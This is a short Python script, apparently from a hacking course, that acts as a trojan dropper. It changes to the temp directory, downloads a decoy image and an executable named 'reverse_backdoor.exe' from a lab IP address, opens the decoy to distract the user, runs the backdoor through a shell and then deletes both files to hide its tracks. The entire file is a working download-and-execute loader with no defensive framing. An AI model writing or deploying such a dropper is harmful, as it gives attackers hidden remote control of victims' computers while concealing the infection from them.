#! /usr/bin/env python

import requests, subprocess, os, tempfile


def download(url):
    get_request = requests.get(url)
    file_name = url.split("/")[-1]
    print(file_name)
    with open(file_name, "wb") as file_output:
        file_output.write(get_request.content)


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

download("http://192.168.81.143/evel-files/relax.jpg")
subprocess.Popen("relax.jpg", shell=True)

download("http://192.168.81.143/evel-files/reverse_backdoor.exe")
subprocess.call("reverse_backdoor.exe", shell=True)

os.remove("relax.jpg")
os.remove("reverse_backdoor.exe")

